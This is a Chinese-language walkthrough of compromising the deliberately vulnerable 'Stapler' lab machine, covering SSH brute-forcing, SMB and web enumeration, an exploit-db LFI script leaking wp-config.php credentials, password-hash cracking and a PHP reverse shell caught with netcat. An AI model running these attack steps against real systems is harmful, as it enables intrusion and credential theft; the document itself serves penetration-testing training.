Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-21 02:43:35
[DATA] max 4 tasks per 1 server, overall 4 tasks, 87 login tries (l:29/p:3), ~22 tries per task
[DATA] attacking ssh://192.168.0.102:22/
[22][ssh] host: 192.168.0.102   login: SHayslett   password: SHayslett
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

使用 账户密码 `SHayslett:SHayslett` 即可登录 ssh

```bash
┌──(root💀kali)-[~/Stapler/22]
└─# ssh SHayslett@192.168.0.102
The authenticity of host '192.168.0.102 (192.168.0.102)' can't be established.
ED25519 key fingerprint is SHA256:eKqLSFHjJECXJ3AvqDaqSI9kP+EbRmhDaNZGyOrlZ2A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.102' (ED25519) to the list of known hosts.
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
SHayslett@192.168.0.102's password: 
Welcome back!



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

SHayslett@red:~$ whoami
SHayslett
SHayslett@red:~$ id
uid=1005(SHayslett) gid=1005(SHayslett) groups=1005(SHayslett)
```

### 139：SMB

在之前服务枚举 `enum4linux` 的结果中，发现发现有效**共享服务名 tmp 与 kathy**

```
 =================================( Share Enumeration on 192.168.0.102 )=================================


        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        kathy           Disk      Fred, What are we doing here?
        tmp             Disk      All temporary files should be stored here
        IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
```

使用 smbclient 工具连接 SMB 服务，其中 `-N` 参数指定空口令登录，**双斜杠后指定服务器地址，单斜杠后指定共享服务名**

#### tmp用户：

在共享服务 tmp 下，只发现一个 ls 文件，下载至本地并打印，像是 root 用户某目录下的文件列举信息，其中还包含一个时间同步服务的相关文件

```bash
┌──(root💀kali)-[~/Stapler/139]
└─# smbclient -N //192.168.0.102/tmp                                                                                                                      1 ⨯
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun 21 09:53:59 2023
  ..                                  D        0  Mon Jun  6 17:39:56 2016
  ls                                  N      274  Sun Jun  5 11:32:58 2016

                19478204 blocks of size 1024. 16396420 blocks available
```

```bash
┌──(root💀kali)-[~/Stapler/139]
└─# cat ls   
.:
total 12.0K
drwxrwxrwt  2 root root 4.0K Jun  5 16:32 .
drwxr-xr-x 16 root root 4.0K Jun  3 22:06 ..
-rw-r--r--  1 root root    0 Jun  5 16:32 ls
drwx------  3 root root 4.0K Jun  5 15:32 systemd-private-df2bff9b90164a2eadc490c0b8f76087-systemd-timesyncd.service-vFKoxJ
```

####  kathy用户：

在共享服务 `kathy` 下，发现 `kathy_stuff` 与 `backup` 两个目录，其中包含了 todo-list.txt、vsftpd.conf、wordpress-4.tar.gz 三个文件，分别下载至本地后，均未搜出可利用的敏感信息：

`todo-list.txt` 包含一条给 kathy 留言，确保帮 Initech 备份了重要数据

`vsftpd.conf` 为本地 FTP 服务配置文件，与 /etc/vsftpd.conf 内容相同

`wordpress-4.tar.gz` 为 4.2.1 版本的 WordPress 服务原始代码，推测就是这里之后的网站的源码

```bash
└─# smbclient -N //192.168.0.102/kathy
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jun  3 12:52:52 2016
  ..                                  D        0  Mon Jun  6 17:39:56 2016
  kathy_stuff                         D        0  Sun Jun  5 11:02:27 2016
  backup                              D        0  Sun Jun  5 11:04:14 2016

                19478204 blocks of size 1024. 16396420 blocks available
smb: \> cd kathy_stuff
smb: \kathy_stuff\> ls
  .                                   D        0  Sun Jun  5 11:02:27 2016
  ..                                  D        0  Fri Jun  3 12:52:52 2016
  todo-list.txt                       N       64  Sun Jun  5 11:02:27 2016

                19478204 blocks of size 1024. 16396420 blocks available
smb: \kathy_stuff\> get todo-list.txt
getting file \kathy_stuff\todo-list.txt of size 64 as todo-list.txt (62.5 KiloBytes/sec) (average 62.5 KiloBytes/sec)
smb: \kathy_stuff\> cd ..
smb: \> cd backup
smb: \backup\> ls
  .                                   D        0  Sun Jun  5 11:04:14 2016
  ..                                  D        0  Fri Jun  3 12:52:52 2016
  vsftpd.conf                         N     5961  Sun Jun  5 11:03:45 2016
  wordpress-4.tar.gz                  N  6321767  Mon Apr 27 13:14:46 2015

                19478204 blocks of size 1024. 16396420 blocks available
```

### 666：未知服务

针对未知服务的端口，可使用 nc 工具进行探测。结果显示为一堆乱码，但其中清晰可见 **message2.jpg 字符串**：

```bash
└─# nc 192.168.0.102 666     
Pd��Hp���,2
           message2.jpgUT       +�QWJ�QWux
                                          ��z
                                             T��P���A@� �UT�T�2>��RDK�Jj�"DL[E�
                                   .........
```

将数据流重定向至本地文件 file_port_666，并使用 file 工具查看，结果显示为 **Zip 压缩包**。

继续使用 unzip 工具解压，得到 message2.jpg 图像文件，打开后发现一条给 **Scott** 的留言：

```bash
┌──(root💀kali)-[~/Stapler/666]
└─# nc 192.168.0.102 666 > file_port_666                                              
                                                                                                                                                              
┌──(root💀kali)-[~/Stapler/666]
└─# file file_port_666 
file_port_666: Zip archive data, at least v2.0 to extract, compression method=deflate
                                                                                                                                                              
┌──(root💀kali)-[~/Stapler/666]
└─# unzip file_port_666
Archive:  file_port_666
  inflating: message2.jpg            
```

<img src=".\图片\Snipaste_2023-06-21_15-14-41.png" alt="Snipaste_2023-06-21_15-14-41"  />

### 80：PHP CLI 服务

在浏览器使用 HTTP 协议访问 80 端口，提示在网站根目录下找不到主页：

<img src=".\图片\Snipaste_2023-06-21_15-15-32.png" alt="Snipaste_2023-06-21_15-15-32" style="zoom:80%;" />

针对一般的 Web 服务，可先用 nikto 漏洞扫描工具进行初步探测。结果显示，根目录下存在 .bashrc 与 .profile 文件，说明根目录可能位于某个用户的主目录下：

遗憾的是，将上述文件下载至本地后，并未发现敏感信息。

```bash
└─# nikto --host http://192.168.0.102/

---------------------------------------------------------------------------
+ Server: No banner retrieved
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /.bashrc: User home dir was found with a shell rc file. This may reveal file and path information.
+ /.profile: User home dir with a shell profile was found. May reveal directory information and system configuration.
+ 8110 requests: 9 error(s) and 4 item(s) reported on remote host
+ End Time:           2023-06-21 03:17:02 (GMT-4) (26 seconds)
---------------------------------------------------------------------------
```

### 12380：WordPress

在浏览器使用 HTTP 协议访问 12380 端口，弹出页面提示 `Coming Soon`：

<img src=".\图片\image-20230621151959067.png" alt="image-20230621151959067" style="zoom:80%;" />

1、nikto 初步探测

结果显示，站点还**支持 HTTPS 协议**访问，并存在 **/admin112233/、/blogblog/、/phpmyadmin/** 等三个目录，存在 **/robots.txt、/icons/README** 等两个文件

用 http 找不到啥，换 https 试试

```bash
└─# nikto --host https://192.168.0.102:12380/
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.0.102
+ Target Hostname:    192.168.0.102
+ Target Port:        12380
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
+ Start Time:         2023-06-21 03:40:07 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: Uncommon header 'dave' found, with contents: Soemthing doesn't look right here.
+ /: The site uses TLS and the Strict-Transport-Security HTTP header is not defined. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /robots.txt: Entry '/blogblog/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/admin112233/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: contains 2 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ Hostname '192.168.0.102' does not match certificate's names: Red.Initech. See: https://cwe.mitre.org/data/definitions/297.html
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ /phpmyadmin/changelog.php: Uncommon header 'x-ob_mode' found, with contents: 1.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
^C                                                                                                          
```

2、gobuster 目录扫描

忽略证书  [子域名挖掘的新操作(gobuster) - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/33999581)

```bash
└─# gobuster dir -u https://192.168.0.102:12380/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak -k
```

```bash
===============================================================
/.html.bak            (Status: 403) [Size: 300]
/.php                 (Status: 403) [Size: 295]
/.html                (Status: 403) [Size: 296]
/index.html           (Status: 200) [Size: 21]
/announcements        (Status: 301) [Size: 332] [--> https://192.168.0.102:12380/announcements/]
/javascript           (Status: 301) [Size: 329] [--> https://192.168.0.102:12380/javascript/]
/robots.txt           (Status: 200) [Size: 59]
Progress: 31611 / 2426171 (1.30%)^C
```

3、观察 robots.txt

<img src=".\图片\Snipaste_2023-06-21_15-53-24.png" alt="Snipaste_2023-06-21_15-53-24" style="zoom:80%;" />

4、发现wordpress网站

```http
https://192.168.0.102:12380/blogblog/
```

<img src=".\图片\Snipaste_2023-06-21_15-52-23.png" alt="Snipaste_2023-06-21_15-52-23" style="zoom:67%;" />

5、wpscan 扫描

补充：这里靶机 ip变动，为 `192.168.0.100`

接下来，使用 wpscan 工具进行针对性扫描。在这之前，先要配置 API Token。在 [WPScan](https://wpscan.com/) 官网注册登录后，进入 Profile 页面获取 API Token，每天有 25 次免费调用机会

并在 Kali Linux 当前 root 用户的主目录下，创建 `~/.wpscan/scan.yml` 配置文件，写入以下内容：

```yml
cli_options:
  api_token: YOUR_API_TOKEN
```

首先探测网站的有效用户名，添加 `--enumerate u1-100` 参数指定前 100 个用户名（实际上没这么多），并添加 `--disable-tls-checks` 参数忽略 TLS 检查。结果显示，共有 17 个用户名，大部分与之前收集的相同：

```bash
└─# wpscan --url https://192.168.0.100:12380/blogblog/ --enumerate u1-100 --disable-tls-checks
```

```
[+] John Smith
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By: Rss Generator (Passive Detection)
[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
[+] garry

[+] elly

[+] peter

[+] barry

[+] heather

[+] harry

[+] scott

[+] kathy

[+] tim

[+] zoe

[+] dave

[+] simon

[+] abby

[+] vicki

[+] pam

```

再探测网站使用的所有插件，添加 `--enumerate ap` 参数指定扫描所有插件，并添加 `--plugins-detection aggressive` 参数指定主动扫描模式。结果显示，共有 4 个插件：

```bash
└─# wpscan --url https://192.168.0.100:12380/blogblog/ --enumerate ap --plugins-detection aggressive --disable-tls-checks
```

```
[+] WordPress readme found: https://192.168.0.100:12380/blogblog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Registration is enabled: https://192.168.0.100:12380/blogblog/wp-login.php?action=register
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: https://192.168.0.100:12380/blogblog/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://192.168.0.100:12380/blogblog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).
 | Found By: Rss Generator (Passive Detection)
 |  - https://192.168.0.100:12380/blogblog/?feed=rss2, <generator>http://wordpress.org/?v=4.2.1</generator>
 |  - https://192.168.0.100:12380/blogblog/?feed=comments-rss2, <generator>http://wordpress.org/?v=4.2.1</generator>

[+] WordPress theme in use: bhost
 | Location: https://192.168.0.100:12380/blogblog/wp-content/themes/bhost/
 | Last Updated: 2023-03-24T00:00:00.000Z
 | Readme: https://192.168.0.100:12380/blogblog/wp-content/themes/bhost/readme.txt
 | [!] The version is out of date, the latest version is 1.7
 | Style URL: https://192.168.0.100:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1
 | Style Name: BHost
 | Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This theme ...
 | Author: Masum Billah
 | Author URI: http://getmasum.net/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2.9 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://192.168.0.100:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1, Match: 'Version: 1.2.9'

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:03:08 <========================================================================> (103470 / 103470) 100.00% Time: 00:03:08
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] advanced-video-embed-embed-videos-or-playlists
 | Location: https://192.168.0.100:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2015-10-14T13:52:00.000Z
 | Readme: https://192.168.0.100:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.0.100:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/, status: 200
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://192.168.0.100:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt

[+] akismet
 | Location: https://192.168.0.100:12380/blogblog/wp-content/plugins/akismet/
 | Latest Version: 5.2
 | Last Updated: 2023-06-21T14:59:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.0.100:12380/blogblog/wp-content/plugins/akismet/, status: 403
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 3.1.5
 |     References:
 |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357
 |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
 |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
 |
 | The version could not be determined.

[+] shortcode-ui
 | Location: https://192.168.0.100:12380/blogblog/wp-content/plugins/shortcode-ui/
 | Last Updated: 2019-01-16T22:56:00.000Z
 | Readme: https://192.168.0.100:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt
 | [!] The version is out of date, the latest version is 0.7.4
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.0.100:12380/blogblog/wp-content/plugins/shortcode-ui/, status: 200
 |
 | Version: 0.6.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://192.168.0.100:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://192.168.0.100:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt

[+] two-factor
 | Location: https://192.168.0.100:12380/blogblog/wp-content/plugins/two-factor/
 | Latest Version: 0.8.0
 | Last Updated: 2023-03-27T09:14:00.000Z
 | Readme: https://192.168.0.100:12380/blogblog/wp-content/plugins/two-factor/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.0.100:12380/blogblog/wp-content/plugins/two-factor/, status: 200
 |
 | The version could not be determined.
```

# Web渗透

##  Advanced Video 插件 LFI 漏洞利用

针对 WordPress 插件，可使用 searchsploit 工具搜索相关漏洞利用脚本。通过搜索插件名，发现 **Advanced Video 插件存在 [LFI 本地文件包含漏洞（EDB-ID 39646）](https://www.exploit-db.com/exploits/39646)** ，并将其 EXP 脚本复制到当前目录：

```bash
searchsploit advanced video
searchsploit -m 39646
```

将 EXP 脚本中的 `url` 变量改为 https://192.168.0.100:12380/blogblog/ 后，通过 python 执行脚本，且需要在 EXP 脚本打上补丁，使其忽略 SSL 的证书校验，加上

```
ssl._create_default_https_context = ssl._create_unverified_context
```

具体请参考：

> [urllib and “SSL: CERTIFICATE_VERIFY_FAILED” Error](https://stackoverflow.com/questions/27835619/urllib-and-ssl-certificate-verify-failed-error)

修复报错后，成功执行 EXP 脚本。然而，并无结果回显，无法得知 wp-config.php 文件内容的输出路径

```bash
└─# python2 39646.py
```

接下来，使用 dirb 工具，配合其默认字典进行目录扫描。结果显示，可访问目录包括 /wp-admin/、/wp-content/、/wp-includes/ 等三个目录，与 WordPress 的默认目录结构相同

```bash
└─# dirb https://192.168.0.100:12380/blogblog                                                                                                           130 ⨯

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Jun 21 22:44:19 2023
URL_BASE: https://192.168.0.100:12380/blogblog/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: https://192.168.0.100:12380/blogblog/ ----
+ https://192.168.0.100:12380/blogblog/index.php (CODE:301|SIZE:0)                                                                                           
==> DIRECTORY: https://192.168.0.100:12380/blogblog/wp-admin/                                                                                                
==> DIRECTORY: https://192.168.0.100:12380/blogblog/wp-content/                                                                                              
==> DIRECTORY: https://192.168.0.100:12380/blogblog/wp-includes/                                                                                             
+ https://192.168.0.100:12380/blogblog/xmlrpc.php (CODE:405|SIZE:42)                                                                                         
                                                                                                                                                             
---- Entering directory: https://192.168.0.100:12380/blogblog/wp-admin/ ----
+ https://192.168.0.100:12380/blogblog/wp-admin/admin.php (CODE:302|SIZE:0)                                                                                  
==> DIRECTORY: https://192.168.0.100:12380/blogblog/wp-admin/css/                                                                                            
==> DIRECTORY: https://192.168.0.100:12380/blogblog/wp-admin/images/                                                                                         
==> DIRECTORY: https://192.168.0.100:12380/blogblog/wp-admin/includes/                                                                                       
+ https://192.168.0.100:12380/blogblog/wp-admin/index.php (CODE:302|SIZE:0)                                                                                  
==> DIRECTORY: https://192.168.0.100:12380/blogblog/wp-admin/js/                                                                                             
==> DIRECTORY: https://192.168.0.100:12380/blogblog/wp-admin/maint/                                                                                          
==> DIRECTORY: https://192.168.0.100:12380/blogblog/wp-admin/network/                                                                                        
==> DIRECTORY: https://192.168.0.100:12380/blogblog/wp-admin/user/                                                                                           
                                                                                                                                                             
---- Entering directory: https://192.168.0.100:12380/blogblog/wp-content/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                             
---- Entering directory: https://192.168.0.100:12380/blogblog/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                             
---- Entering directory: https://192.168.0.100:12380/blogblog/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                             
---- Entering directory: https://192.168.0.100:12380/blogblog/wp-admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                             
---- Entering directory: https://192.168.0.100:12380/blogblog/wp-admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                             
---- Entering directory: https://192.168.0.100:12380/blogblog/wp-admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                             
---- Entering directory: https://192.168.0.100:12380/blogblog/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                             
---- Entering directory: https://192.168.0.100:12380/blogblog/wp-admin/network/ ----
+ https://192.168.0.100:12380/blogblog/wp-admin/network/admin.php (CODE:302|SIZE:0)                                                                          
+ https://192.168.0.100:12380/blogblog/wp-admin/network/index.php (CODE:302|SIZE:0)                                                                          
                                                                                                                                                             
---- Entering directory: https://192.168.0.100:12380/blogblog/wp-admin/user/ ----
+ https://192.168.0.100:12380/blogblog/wp-admin/user/admin.php (CODE:302|SIZE:0)                                                                             
+ https://192.168.0.100:12380/blogblog/wp-admin/user/index.php (CODE:302|SIZE:0)                                                                             
                                                                                                                                                             
-----------------
END_TIME: Wed Jun 21 22:44:32 2023
DOWNLOADED: 18448 - FOUND: 8
```

经过一番搜索，终于在 **/blogblog/wp-content/uploads/** 目录下发现可疑图像文件，其创建时间与 EXP 脚本执行时间一致：

<img src=".\图片\Snipaste_2023-06-22_10-47-35.png" alt="Snipaste_2023-06-22_10-47-35" style="zoom:67%;" />



```bash
┌──(root💀kali)-[~/attack]
└─# wget https://192.168.0.100:12380/blogblog/wp-content/uploads/719823961.jpeg --no-check-certificate
--2023-06-21 22:49:11--  https://192.168.0.100:12380/blogblog/wp-content/uploads/719823961.jpeg
Connecting to 192.168.0.100:12380... connected.
WARNING: The certificate of ‘192.168.0.100’ is not trusted.
WARNING: The certificate of ‘192.168.0.100’ doesn't have a known issuer.
The certificate's owner does not match hostname ‘192.168.0.100’
HTTP request sent, awaiting response... 200 OK
Length: 3042 (3.0K) [image/jpeg]
Saving to: ‘719823961.jpeg’

719823961.jpeg                          100%[=============================================================================>]   2.97K  --.-KB/s    in 0s      

2023-06-21 22:49:11 (235 MB/s) - ‘719823961.jpeg’ saved [3042/3042]

                                                                                                                                                              
┌──(root💀kali)-[~/attack]
└─# ls
39646.py  719823961.jpeg
                                                                                                                                                              
┌──(root💀kali)-[~/attack]
└─# cat 719823961.jpeg 
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'V 5p=[.Vds8~SX;>t)++Tt57U6{Xe`T|oW^eQ!mHr }]>9RX07W<sZ,I~`6Y5-T:');
define('SECURE_AUTH_KEY',  'vJZq=p.Ug,]:<-P#A|k-+:;JzV8*pZ|K/U*J][Nyvs+}&!/#>4#K7eFP5-av`n)2');
define('LOGGED_IN_KEY',    'ql-Vfg[?v6{ZR*+O)|Hf OpPWYfKX0Jmpl8zU<cr.wm?|jqZH:YMv;zu@tM7P:4o');
define('NONCE_KEY',        'j|V8J.~n}R2,mlU%?C8o2[~6Vo1{Gt+4mykbYH;HDAIj9TE?QQI!VW]]D`3i73xO');
define('AUTH_SALT',        'I{gDlDs`Z@.+/AdyzYw4%+<WsO-LDBHT}>}!||Xrf@1E6jJNV={p1?yMKYec*OI$');
define('SECURE_AUTH_SALT', '.HJmx^zb];5P}hM-uJ%^+9=0SBQEh[[*>#z+p>nVi10`XOUq (Zml~op3SG4OG_D');
define('LOGGED_IN_SALT',   '[Zz!)%R7/w37+:9L#.=hL:cyeMM2kTx&_nP4{D}n=y=FQt%zJw>c[a+;ppCzIkt;');
define('NONCE_SALT',       'tb(}BfgB7l!rhDVm{eK6^MSN-|o]S]]axl4TE_y+Fi5I-RxN/9xeTsK]#ga_9:hJ');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
        define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');

define('WP_HTTP_BLOCK_EXTERNAL', true);
```

仔细查看配置内容，终于发现了后端 MySQL 数据库的用户名为 root，口令为 plbkac

```
root:plbkac
```

## MySQL 深入探索

这里可以直接 mysql 直连，也可以登录之前发现的 phpmyadmin

其中 **wp_users 表**中存储了 WordPress 的用户相关信息，**user_login 列**为登录用户名，**user_pass 列**为登录口令散列值 

<img src=".\图片\Snipaste_2023-06-22_10-57-27.png" alt="Snipaste_2023-06-22_10-57-27" style="zoom:80%;" />

截取以上 16 个用户的 user_login 与 user_pass 列，按 `<key>:<value>` 格式排列好，保存至 user_pass 文件中

```bash
┌──(root💀kali)-[~/attack]
└─# cat user_pass                                                                                                                                       
John:$P$B7889EMq/erHIuZapMB8GEizebcIy9.
Elly:$P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0
Peter:$P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0
barry:$P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0
heather:$P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10
garry:$P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1
harry:$P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0
scott:$P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1
kathy:$P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0
tim:$P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0
ZOE:$P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1
Dave:$P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy.
Simon:$P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0
Abby:$P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs.
Vicki:$P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131
Pam:$P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0
```

接下来，使用 john 工具，配合系统自带字典 `/var/share/wordlists/rockyou.txt` 进行登录口令爆破。结果显示，其中**有 12 个用户使用了弱口令**：

```bash
└─# john --wordlist=/usr/share/wordlists/rockyou.txt user_pass
```

```
cookie           (scott)     
monkey           (harry)     
football         (garry)     
coolgirl         (kathy)     
washere          (barry)     
incorrect        (John)     
thumb            (tim)     
0520             (Pam)     
```

# 持续控制

## 文件上传 PHP 反弹 shell

访问 /blogblog/wp-login.php 文件，弹出 WordPress 控制台登录页面，使用之前破解的账号密码登录试试，用 john 登录，发现其是管理员

<img src=".\图片\Snipaste_2023-06-22_11-19-21.png" alt="Snipaste_2023-06-22_11-19-21" style="zoom:80%;" />

点击 Plugins 导航栏，发现插件上传安装页面，猜测可能存在文件上传漏洞

<img src=".\图片\Snipaste_2023-06-22_11-20-48.png" alt="Snipaste_2023-06-22_11-20-48" style="zoom:80%;" />

尝试上传 [**php-reverse-shell.php**](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) 脚本，其中 `$ip` 变量为反弹 IP，需改为 Kali Linux 的 192.1680.103 地址

同样地，在 /blogblog/wp-content/uploads/ 目录下，发现 php-reverse-shell.php 脚本文件，点击后发现靶机的 shell 已反弹至 Kali Linux 的 1234 端口

<img src=".\图片\Snipaste_2023-06-22_11-31-46.png" alt="Snipaste_2023-06-22_11-31-46" style="zoom:80%;" />

```bash
└─# nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.0.103] from (UNKNOWN) [192.168.0.100] 48414
